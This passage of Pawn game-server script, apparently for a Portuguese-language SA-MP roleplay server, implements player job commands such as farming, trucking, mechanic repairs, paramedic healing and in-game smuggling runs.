		}
		
	    return 1;
	}

	if(strcmp(cmd, "/abastecimentos", true) == 0)
	{
	    new string[128], place[64];
	    new amount, offset, worlds;
	    
	    SendClientMessage(playerid, COLOUR_BARMAN, "[-----] Locais de Bebidas [-----]");
	    
	    for(new ds = 0; ds < sizeof DrinkSupply; ds++)
	    {
	        if(ds == 0) place = ("Discotecas"), 	worlds = 1;
			if(ds == 1) place = ("Boates"), 		worlds = 1;
			if(ds == 2) place = ("Restaurantes"),   worlds = 9;
			if(ds == 3) place = ("Bares"), 			worlds = 11;
			    
			amount = 0;
			offset = DrinkSupply[ds];
			
			while(offset != 0)
			{
			    if(offset & 0x1)
			        amount++;
			        
				offset >>= 1;
			}
			
			amount = worlds - amount;
			
			if(amount > 0)
				format(string, sizeof string, "%s - %d precisa(m) abastecer", place, amount);
				
			else
			    format(string, sizeof string, "%s - Nenhum(a) precisa abastecer", place);
			    
			SendClientMessage(playerid, COLOUR_WHITE, string);
	    }
	    
	    return 1;
	}
	
    // Barman - Fim

    // Lixeiro - Inicio
	
    if(strcmp(cmd, "/coletarlixo", true) == 0)
	{
	    new dump;

	    if(CheckpointStatus[playerid] == CHECKPOINT_TRASH)
	    {
	        DisablePlayerCheckpoint(playerid);
			CheckpointStatus[playerid] = CHECKPOINT_NONE;
			DrawTextForPlayer(playerid, "Coleta do lixo finalizada", COLOUR_GARBAGE, TEXTDRAW_STYLE_2, 2000);
			return 1;
	    }

		dump = random(sizeof Dumps);

		DisablePlayerCheckpoint(playerid);
		CheckpointStatus[playerid] = CHECKPOINT_TRASH;
		SetPlayerCheckpoint(playerid, Dumps[dump][0], Dumps[dump][1], Dumps[dump][2], 3.0);
		DrawTextForPlayer(playerid, "Coleta do lixo iniciada", COLOUR_GARBAGE, TEXTDRAW_STYLE_2, 2000);
	    return 1;
	}
	
	if(strcmp(cmd, "/lixao", true) == 0)
	{
	    new string[128];
		new value;

		if(Company[playerid] != COMPANY_TRASH)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está no Lixão.");
		    return 1;
		}

		if(Collect[playerid] == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não possui lixo para descarregar.");
		    return 1;
		}

		value = Collect[playerid] * 20;
		Collect[playerid] = 0;
		GivePlayerSysMoney(playerid, value);
		format(string, sizeof string, "Lixo descarregado, você recebeu $%d,00 dólares.", value);
		SendClientMessage(playerid, COLOUR_UNEMPLOYED, string);
        return 1;
	}
	
    // Lixeiro - Fim

	// Agricultor - Inicio
	
	if(strcmp(cmd, "/leite", true) == 0)
	{
	    new milk_cmd[128];
	    
	    milk_cmd = strtok(cmdtext, idx);
	    
	    if(strlen(milk_cmd) > 0)
	    {
	        if(strcmp(milk_cmd, "ordenhar", true) == 0)
	        {
				new cow;
				new Float:OX, Float:OY, Float:OZ, Float:ORZ, Float:OOFF;
				
				cow = GetNextMatrixObject(playerid, Cows, 15.0);
				
				if(cow == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar perto de uma vaca para tirar leite.");
				    return 1;
				}
				
				if(Cowboy[cow] != INVALID_PLAYER_ID)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Esta vaca está ocupada no momento, ache outra ou tente mais tarde.");
				    return 1;
				}
				
				if(FarmerTimer[playerid])
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você já está ordenhando, ou está plantando milho.");
	                return 1;
	            }
	            
				if(Milk[playerid] < 0)
				    Milk[playerid] = 0;
				    
				Cowboy[cow] = playerid;
				GetObjectPos(Cows[cow], OX, OY, OZ);
				GetObjectRot(Cows[cow], OOFF, OOFF, ORZ);
				SetPlayerPos(playerid, OX + 1.0 * floatsin(-(ORZ + 30.0), degrees), OY + 1.0 * floatcos(-(ORZ + 30.0), degrees), OZ);
				SetPlayerFacingAngle(playerid, ORZ);
				ApplyAnimation(playerid, "CAR", "Fixn_Car_Loop", 4.1, 0, 1, 1, 1, -1, 1);
				SendClientMessage(playerid, COLOUR_FARMER, "Cê tá tirando o leite pera um pedaço aí. Cê já sai de baixo da vaca. Calminha sô!");
				FarmerTimer[playerid] = SetTimerEx("Milking", 40000 + random(20000), false, "d", playerid);
	            return 1;
	        }
	        
	        if(strcmp(milk_cmd, "vender", true) == 0)
	        {
	            new string[128];
	            new pay;
	            
	            if(GetPlayerInt(playerid) != INT_FARM)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Entre na fazenda para vender o leite.");
	                return 1;
            	}
	            
				if(Milk[playerid] < 1000)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você precisa de pelo menos 1L de leite para vender.");
				    return 1;
				}
				
				pay = Milk[playerid] / 8;
				pay -= pay % 10;
				Pay(playerid, pay);
				format(string, sizeof string, "Leite vendido (%d,%dL), você recebeu $%d,00 dólares.", Milk[playerid] / 1000, Milk[playerid] % 1000, pay);
				SendClientMessage(playerid, COLOUR_FARMER, string);
				Milk[playerid] = 0;
	            return 1;
	        }
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /leite [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "ordenhar, vender");
	    return 1;
	}
	
	if(strcmp(cmd, "/milho", true) == 0)
	{
	    new corn_cmd[128];

	    corn_cmd = strtok(cmdtext, idx);

	    if(strlen(corn_cmd) > 0)
	    {
	        if(strcmp(corn_cmd, "plantar", true) == 0)
	        {
	            if(!IsPlayerInJobVehicle(playerid, FARM) || GetVehicleModel(GetPlayerVehicleID(playerid)) != 532)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma Combine da Fazenda para poder plantar.");
	                return 1;
	            }
	            
				if(Area[playerid] != AREA_FARM)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na área de plantio.");
				    return 1;
				}
				
	            if(Corn[playerid] & 0x1)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você já está plantando milho.");
	                return 1;
	            }
	            
	            if(FarmerTimer[playerid])
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não pode plantar enquanto estiver ordenhando.");
	                return 1;
	            }
	            
	            if(Corn[playerid] < 0)
	                Corn[playerid] = 0;
	                
	            Corn[playerid] |= 1;
	            SendClientMessage(playerid, COLOUR_FARMER, "Plantio começado, espere a colheita e o ensacamento para poder ir vender.");

				if(CurrentWeather == 4)
				{
				    SendClientMessage(playerid, COLOUR_FARMER, "Sortudo! Estamos em época de chuva, a colheita irá sair mais rápido.");
                    FarmerTimer[playerid] = SetTimerEx("Planting", 30000 + random(10000), false, "d", playerid);
                    return 1;
				}
				
				FarmerTimer[playerid] = SetTimerEx("Planting", 50000 + random(20000), false, "d", playerid);
	            return 1;
	        }
	        
	        if(strcmp(corn_cmd, "vender", true) == 0)
	        {
	            new string[128];
	            new pay;
	            
	            if(GetPlayerInt(playerid) != INT_FARM)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Entre na fazenda para vender o milho.");
	                return 1;
            	}
            	
            	Corn[playerid] >>= 1;
            	
            	if(Corn[playerid] < 2000)
            	{
            	    SendClientMessage(playerid, COLOUR_GRAY, "Você precisa de pelo menos 2kg de milho para poder vender.");
	                return 1;
            	}
            	
				pay = Corn[playerid] / 12;
				pay -= pay % 10;
            	format(string, sizeof string, "Milho vendido (%d,%dkg), você recebeu $%d,00 dólares.", Corn[playerid] / 1000, Corn[playerid] % 1000, pay);
				SendClientMessage(playerid, COLOUR_FARMER, string);
            	Corn[playerid] = 0;
	            return 1;
	        }
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /milho [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "plantar, vender");
	    return 1;
	}
	
	// Agricultor - Fim
	
	// Caminhoneiro - Inicio

    if(strcmp(cmd, "/transporte", true) == 0)
	{
	    new vehid, trailerid, model;
	    new Float:X, Float:Y, Float:Z;
	    
	    if(Transport[playerid] != 0)
	    {
	        Transport[playerid] = 0;
	        MetersTraveled[playerid] = 0;
	        DisablePlayerRaceCheckpoint(playerid);
	        DeleteTimer(ResumeTimer[playerid]);
	        DrawTextForPlayer(playerid, "Transporte cancelado", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
	        return 1;
	    }
	    
	    if(Area[playerid] != AREA_TRAILER)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Area de Transporte.");
	        return 1;
	    }
	    
	    if(!IsPlayerInAnyVehicle(playerid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um RoadTrain.");
	        return 1;
	    }
	    
	    vehid = GetPlayerVehicleID(playerid);
	    
	    if(GetVehicleModel(vehid) != 515)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um RoadTrain.");
	        return 1;
	    }
	    
	    if(!IsTrailerAttachedToVehicle(vehid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está com um trailer anexado ao caminhão.");
	        return 1;
	    }
	    
	    trailerid = GetJobVehicle(GetVehicleTrailer(vehid), TRAILER);
	    
	    if(trailerid == -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Trailer inválido.");
	        return 1;
	    }
	    
		model = GetVehicleModel(GetVehicleTrailer(vehid));

		switch(model)
	    {
	        case 435:
			{
			    X = -14.6662, Y = -276.5175, Z = 5.4296;
                DrawTextForPlayer(playerid, "Transporte de alimentos", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
			}

			case 584:
			{
			    X = 192.1549, Y = 1359.1562, Z = 10.5859;
                DrawTextForPlayer(playerid, "Transporte de combustível", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
			}

			case 591:
			{
			    X = -576.1779, Y = -500.2688, Z = 25.5234;
                DrawTextForPlayer(playerid, "Transporte de brinquedos", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
			}

			default:
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Trailer inválido para transporte.");
			    return 1;
			}
	    }
	    
	    Transport[playerid] = trailerid + 1;
	    MetersTraveled[playerid] = 0;
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 4.0);
		GetVehiclePos(vehid, TruckOrigin[playerid][0], TruckOrigin[playerid][1], TruckOrigin[playerid][2]);
	    SendClientMessage(playerid, COLOUR_TRUCKER, "Transporte iniciado, vá para o CheckPoint abastecer o trailer.");
	    return 1;
	}
	
	// Caminhoneiro - Fim
	
	// Jornalista - Inicio
	
	if(strcmp(cmd, "/anunciar", true) == 0)
	{
	    new text[128];
	    
	    strmid(text, cmdtext, 10, strlen(cmdtext));
	    
	    if(!strlen(text))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /anunciar [texto]");
	        return 1;
	    }
	    
	    if(!IsPlayerInJobVehicle(playerid, NEWS))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo de anúncio.");
	        return 1;
	    }
	    
		if(Announce[playerid] > 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Aguarde um momento para publicar outro anúncio.");
	        return 1;
		}
		
	    Announce[playerid] = 18;
	    SendClientMessageToAll(COLOUR_SKY_BLUE, "[========== VIRTUAL'NEWS- ANÚNCIOS ==========]");
	    SendClientMessageToAll(COLOUR_JOURNALIST, text);
	    DrawTextForPlayer(playerid, "Anúncio publicado", COLOUR_JOURNALIST, TEXTDRAW_STYLE_2, 3000);
	    return 1;
	}
	
	// Jornalista - Fim
	
	// Contrabandista - Inicio
	
	if(strcmp(cmd, "/contrabando", true) == 0)
	{
	    new rand;
		new Float:X, Float:Y, Float:Z;
		
		if(Smuggling[playerid] > 0)
		{
		    Smuggling[playerid] = 0;
		    SmugglingPart[playerid] = 0;
		    DisablePlayerRaceCheckpoint(playerid);
		    SendClientMessage(playerid, COLOUR_SMUGGLER, "Contrabando cancelado.");
		    return 1;
		}

		rand = random(4) + 1;
		
		if(rand == 1)
		{
		    X = -2328.99, Y = 1527.79, Z = 0.25;
		    SendClientMessage(playerid, COLOUR_SMUGGLER, "Contrabando de Pacote.");
			SendClientMessage(playerid, COLOUR_SMUGGLER, "Prossiga para o navio.");
		}
		
		else if(rand == 2)
		{
		    X = 2236.5403, Y = -2213.8721, Z = 13.5469;
		    SendClientMessage(playerid, COLOUR_SMUGGLER, "Contrabando de Carros.");
			SendClientMessage(playerid, COLOUR_SMUGGLER, "Vá pegar o carro no local indicado.");
		}
		
		else if(rand == 3)
		{
		    X = 1854.1887, Y = -1914.7314, Z = 15.2568;
		    SendClientMessage(playerid, COLOUR_SMUGGLER, "Contrabando de Armas.");
			SendClientMessage(playerid, COLOUR_SMUGGLER, "Vá falar com o negociante para ele lhe indicar onde estão as armas escondidas.");
		}
		
		else
		{
		    X = 2145.0332, Y = -978.2762, Z = 60.9297;
		    SendClientMessage(playerid, COLOUR_SMUGGLER, "Contrabando de Drogas.");
			SendClientMessage(playerid, COLOUR_SMUGGLER, "Vá pegar as drogas com o traficante.");
		}
		
		Smuggling[playerid] = rand;
		SmugglingPart[playerid] = 0;
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 4.0);
	    return 1;
	}
	
	// Contrabandista - Fim
	
    // Mecânico - Inicio

    if(strcmp(cmd, "/consertar", true) == 0)
	{
	    new vpath[128];
	    new vehid;
	    new Float:X, Float:Y, Float:Z, Float:A, Float:health;
	    new Text:tdrepair;
		
        if(VFrozenFlags[playerid] & VFROZEN_REPAIR)
   	    {
        	SendClientMessage(playerid, COLOUR_GRAY, "Você já está consertando um veículo.");
         	return 1;
   	    }

		if(IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar fora do veículo");
         	return 1;
		}
		
        vehid = GetNextPlayerVehicle(playerid, 10.0);
        
		if(vehid == INVALID_VEHICLE_ID)
  		{
    		SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
      		return 1;
        }
		
		vpath = GetVehicleFilePath(vehid);

		if(!IsPlayerAdmin(playerid) && strcmp(hGetString(vpath, "Owner"), PlayerName(playerid), true) == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode consertar um veículo seu.");
      		return 1;
		}
		
  		GetVehicleHealth(vehid, health);
		GetVehiclePos(vehid, X, Y, Z);
		GetVehicleZAngle(vehid, A);
		A += 90.0;
		X += 1.5 * floatsin(-A, degrees);
		Y += 1.5 * floatcos(-A, degrees);

		if(health >= 1000.0)
  		{
    		SendClientMessage(playerid, COLOUR_GRAY, "Este veículo já está íntegro.");
      		return 1;
        }
		
		tdrepair = TextDrawCreate(21.0, 125.0, "_");
		TextDrawAlignment(tdrepair, 0);
		TextDrawFont(tdrepair, 1);
		TextDrawLetterSize(tdrepair, 0.5, 1.5);
		TextDrawColour(tdrepair, COLOUR_WHITE);
		TextDrawSetProportional(tdrepair, 1);
		TextDrawSetShadow(tdrepair, 1);

		TextDrawShowForPlayer(playerid, tdrepair);
		VFrozenFlags[playerid] |= VFROZEN_REPAIR;
		SetPlayerPos(playerid, X, Y, Z);
		SetPlayerFacingAngle(playerid, A);
		ApplyAnimation(playerid, "CAR", "Fixn_Car_Loop", 4.1, 0, 1, 1, 1, -1, 1);
		SendClientMessage(playerid, COLOUR_MECHANIC, "Consertando... Peça para o jogador usar /pagar");
     	SetTimerEx("Repairing", 220, false, "dddd", playerid, vehid, 0, _:tdrepair);
	    return 1;
	}

	if(strcmp(cmd, "/pintar", true) == 0)
	{
	    new vpath[128];
	    new vehid;
	    
	    if(VFrozenFlags[playerid] & VFROZEN_PAINT)
	    {
     		SendClientMessage(playerid, COLOUR_GRAY, "Você já está pintando um veículo.");
       		return 1;
  	    }

		if(!IsPlayerInAnyVehicle(playerid))
  		{
    		SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
      		return 1;
        }

		vehid = GetPlayerVehicleID(playerid);
		
		if(!IsPlayerVehicle(vehid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode pintar um veículo do servidor.");
      		return 1;
		}
		
		vpath = GetVehicleFilePath(vehid);
		
		if(!IsPlayerAdmin(playerid) && strcmp(hGetString(vpath, "Owner"), PlayerName(playerid), true) == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode pintar um veículo seu.");
      		return 1;
		}
		
		KeyEvent[playerid] |= KEY_EVENT_PAINTING;
  		VFrozenFlags[playerid] |= VFROZEN_PAINT;
    	TogglePlayerControllable(playerid, false);
     	PaintVehicle[playerid] = vehid;
      	PaintStage[playerid] = 0;
       	PaintColours[playerid] = GetVehicleColoursEx(vehid);
        TextDrawShowForPlayer(playerid, tdarrows);
        DrawTextForPlayer(playerid, "Pressione ~g~~k~~PED_SPRINT~ ~w~para concluir.", COLOUR_WHITE, TEXTDRAW_STYLE_4, 5000);
	    return 1;
	}

	if(strcmp(cmd, "/instalar", true) == 0)
	{
	    new vpath[128], item[128];
	    new vehid;

		if(!IsPlayerInAnyVehicle(playerid))
  		{
    		SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
      		return 1;
        }

		vehid = GetPlayerVehicleID(playerid);

		if(!IsPlayerVehicle(vehid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode instalar itens em um veículo do servidor.");
      		return 1;
		}

		vpath = GetVehicleFilePath(vehid);

		if(!IsPlayerAdmin(playerid) && strcmp(hGetString(vpath, "Owner"), PlayerName(playerid), true) == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode instalar em um veículo seu.");
      		return 1;
		}
		
		item = strtok(cmdtext, idx);
		
		if(strlen(item) > 0)
		{
		    if(strcmp(item, "kit", true) == 0)
		    {
				new params;
				
				params = hGetInt(vpath, "Params");

     	    	if(params & 2)
     	    	{
     	    	    SendClientMessage(playerid, COLOUR_GRAY, "Este veículo já está com as travas acionadas.");
     	    	    return 1;
     	    	}
     	    	
     	    	hSetInt(vpath, "Params", params | 2);
     	    	SendClientMessage(playerid, COLOUR_MECHANIC, "Travas instaladas, peça para o jogador usar /pagar");
     	    	return 1;
		    }
		    
		    if(strcmp(item, "fume", true) == 0)
		    {
		        new params;
		        
		       	params = hGetInt(vpath, "Params");
		        
		        if(params & 4)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Este veículo já possui vidro fumê.");
     	    	    return 1;
		        }
		        
		        hSetInt(vpath, "Params", params | 4);
	            SendClientMessage(playerid, COLOUR_MECHANIC, "Vidro Fumê instalado, peça para o jogador usar /pagar");
				return 1;
		    }
		    
		    if(strcmp(item, "airbag", true) == 0)
		    {
		        if(hGetInt(vpath, "Airbag") >= 3)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Este veículo já possui airbags.");
     	    	    return 1;
		        }
		        
		        hSetInt(vpath, "Airbag", 3);
		        SendClientMessage(playerid, COLOUR_MECHANIC, "Airbags instalados, peça para o jogador usar /pagar");
				return 1;
		    }
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /instalar [item] - ITENS DISPONÍVEIS:");
		SendClientMessage(playerid, COLOUR_GRAY, "kit, fume, airbag");
	    return 1;
	}

    // Mecânico - Fim
    
	// Paramédico - Inicio
	
	if(strcmp(cmd, "/pegarkit", true) == 0)
	{
	    if(Area[playerid] != AREA_HOSPITAL)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está no Hospital.");
	        return 1;
	    }
	    
	    if(MedicKit[playerid] >= 3)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você já possui o máximo de kits médicos.");
	        return 1;
	    }
	    
		MedicKit[playerid] = 3;
		SendClientMessage(playerid, COLOUR_PARAMEDIC, "Kits Médicos adquiridos.");
	    return 1;
	}
	
	if(strcmp(cmd, "/curativo", true) == 0)
	{
	    new tmp[128], string[128];
	    new plid;
	    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ, Float:H;
	    
	    if(Dying[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está morrendo, não pode curar um jogador.");
	        return 1;
	    }

	    if(Limp[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está mancando, não pode curar um jogador.");
	        return 1;
	    }
	    
	    tmp = strtok(cmdtext, idx);
	    
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /curativo [id]");
	        return 1;
	    }
	    
	    plid = strval(tmp);
	    
	    if(!IsPlayerConnected(plid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	        return 1;
	    }
	    
		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerPos(plid, PX, PY, PZ);
		
		if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Chegue mais perto do jogador.");
	        return 1;
		}
		
		if(MedicKit[playerid] <= 0)
		{
            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui kit médico.");
	        return 1;
		}
		
		GetPlayerSysHealth(plid, H);
		
		if(H >= 70.0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não precisa de curativos.");
	        return 1;
		}
		
		if(!IsPlayerAdmin(playerid) && plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-curar.");
	        return 1;
		}
		
		MedicKit[playerid]--;
		SetPlayerSysHealth(plid, 75.0);
		SendClientMessage(playerid, COLOUR_PARAMEDIC, "Curativos aplicados, peça para o jogador usar /pagar");
		format(string, sizeof string, "O Paramédico %s lhe aplicou curativos, use /pagar", PlayerName(playerid));
		SendClientMessage(plid, COLOUR_WHITE, string);
		return 1;
	}
	
	if(strcmp(cmd, "/tratar", true) == 0)
	{
	    new tmp[128], string[128];
	    new plid;
	    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

	    if(Dying[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está morrendo, não pode tratar um jogador.");
	        return 1;
	    }

	    if(Limp[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está mancando, não pode tratar um jogador.");
	        return 1;
	    }

	    tmp = strtok(cmdtext, idx);

	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /tratar [id]");
	        return 1;
	    }

	    plid = strval(tmp);

	    if(!IsPlayerConnected(plid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	        return 1;
	    }

		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerPos(plid, PX, PY, PZ);

		if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Chegue mais perto do jogador.");
	        return 1;
		}

		if(MedicKit[playerid] <= 0)
		{
            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui kit médico.");
	        return 1;
		}
		
		if(!IsPlayerAdmin(playerid) && plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-tratar.");
	        return 1;
		}
		
		MedicKit[playerid]--;
		pDrunk[plid] = 0;
		SetPlayerCounter(plid, COUNTER_DRUG, 0);
		SendClientMessage(playerid, COLOUR_PARAMEDIC, "Tratamento feito, peça para o jogador usar /pagar");
		format(string, sizeof string, "O Paramédico %s lhe tratou de drogas e álcool, use /pagar", PlayerName(playerid));
		SendClientMessage(plid, COLOUR_WHITE, string);
		return 1;
	}
	    
	if(strcmp(cmd, "/salvar", true) == 0)
	{
		new plid;
		new Float:X, Float:Y, Float:Z, Float:A, Float:PX, Float:PY;
		
		if(Dying[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está morrendo, não pode salvar um jogador.");
	        return 1;
	    }

	    if(Limp[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está mancando, não pode salvar um jogador.");
	        return 1;
	    }
		
		plid = GetNextPlayer(playerid, NAME_TAG_DRAW_DISTANCE);
		
		if(plid == INVALID_PLAYER_ID)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar próximo de alguém inconsciente.");
		    return 1;
		}
		
		if(Dying[plid] == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar próximo de alguém inconsciente.");
		    return 1;
		}
        
		if(strcmp(animlib, "MEDIC", false) == 0 && strcmp(animname, "CPR", false) == 0)
	    {
		    SendClientMessage(playerid, COLOUR_GRAY, "Você já está salvando um jogador.");
		    return 1;
		}
		
		GetPlayerPos(plid, X, Y, Z);
		GetPlayerFacingAngle(plid, A);
		A += ((random(2) == 0) ? 90.0 : 270.0);
		PX = X + 0.5 * floatsin(-A, degrees);
		PY = Y + 0.5 * floatcos(-A, degrees);
		A = 180 - atan2(PX - X, PY - Y);
		SetPlayerPos(playerid, PX, PY, Z);
		SetPlayerFacingAngle(playerid, A);
		ApplyAnimation(playerid, "MEDIC", "CPR", 4.1, 0, 1, 1, 1, -1, 0);
		DrawTextForPlayer(playerid, "Salvando...", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2500);
		SetTimerEx("Saving", 3000, false, "dd", playerid, plid);
		return 1;
	}

 	// Paramédico - Fim
	
	// Segurança - Inicio
	
	if(strcmp(cmd, "/transportar", true) == 0)
	{
	    if(Pouch[playerid] != -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você já está com o malote.");
	        return 1;
	    }
	    
	    if(Company[playerid] != COMPANY_SECURITY)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar na Área Forte (entrada).");
	        return 1;
	    }
	    
	    Pouch[playerid] = GetPlayerJobVehicle(playerid, SECURITY);
	    
	    if(Pouch[playerid] == -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em um Carro Forte.");
	        return 1;
	    }
	    
	    SendClientMessage(playerid, COLOUR_SECURITY, "Carro Forte carregado, transporte o dinheiro para algum Banco.");
		SendClientMessage(playerid, COLOUR_SECURITY, "Cuidado! Assaltantes podem estar à sua espera, use /escolta para solicitar escolta policial.");
	    return 1;
	}
	
	if(strcmp(cmd, "/escolta", true) == 0)
	{
		new string[128];
		
		if(Pouch[playerid] == -1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está no meio de um transporte.");
	        return 1;
		}
		
		SendClientMessage(playerid, COLOUR_SECURITY, "Escolta solicitada.");
		format(string, sizeof string, "%s está solicitando escolta policial para carregar o malote.", PlayerName(playerid));
		SendClientMessageToPolice(COLOUR_SWAT, string);
	    return 1;
	}
	
	// Segurança - Fim
	
	// Motorista Particular - Inicio
	
	if(strcmp(cmd, "/limo", true) == 0)
	{
		new limo_cmd[128];
		new limo;
		
		limo_cmd = strtok(cmdtext, idx);
		limo = GetPlayerJobVehicle(playerid, STRETCH);
		
		if(limo == -1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma limosine da companhia.");
		    return 1;
		}
		
		if(strlen(limo_cmd) > 0)
		{
		    if(strcmp(limo_cmd, "lavar", true) == 0)
		    {
		        if(Area[playerid] != AREA_GAS_STATION)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não está no posto.");
		            return 1;
		        }
		        
		        if(StretchStatus[limo] & 1)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Esta limosine está brilhando, não precisa de lavagem por enquanto.");
		            return 1;
		        }
		        
		        StretchStatus[limo] |= 1;
		        SendClientMessage(playerid, COLOUR_DRIVER, "Beleza, feche os vidros, a lavagem vai começar...");
		        SetTimerEx("WaitingLimo", 20000 + random(20000), false, "dd", playerid, 1);
		        return 1;
		    }
		    
		    if(strcmp(limo_cmd, "revisar", true) == 0)
		    {
		        if(Area[playerid] != AREA_CUSTOM_SHOP)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você precisa estar em alguma oficina.");
		            return 1;
		        }
		        
		        if(StretchStatus[limo] & 2)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Esta limosine já foi revisada.");
		            return 1;
		        }
		        
		        StretchStatus[limo] |= 2;
		        SendClientMessage(playerid, COLOUR_DRIVER, "Revisando o motor, isto vai levar um tempo...");
		        SetTimerEx("WaitingLimo", 40000 + random(20000), false, "dd", playerid, 2);
		        return 1;
		    }
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /limo [comando] - COMANDOS DISPONÍVEIS:");
		SendClientMessage(playerid, COLOUR_GRAY, "lavar, revisar");
		return 1;
	}
	
	// Motorista Particular - Fim
	
	// Vendedor de Armas - Inicio
	
	if(strcmp(cmd, "/arma", true) == 0)
	{
	    new weapon_cmd[128];
	    
	    weapon_cmd = strtok(cmdtext, idx);
	    
	    if(strlen(weapon_cmd) > 0)
	    {
	        if(strcmp(weapon_cmd, "vender", true) == 0)
	        {
	            new tmp[128], string[128];
	            new plid, weaponid, catridges, res;
				new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
				
	            if(WeaponMaterial[playerid] & 0xFF <= 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não tem armas, vá pegá-las na Ammu Nation.");
	                return 1;
	            }
	            
				tmp = strtok(cmdtext, idx);
				
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /arma vender [id] [arma] [cartuchos]");
				    return 1;
				}
				
				plid = strval(tmp);
				
				if(!IsPlayerConnected(plid))
				{
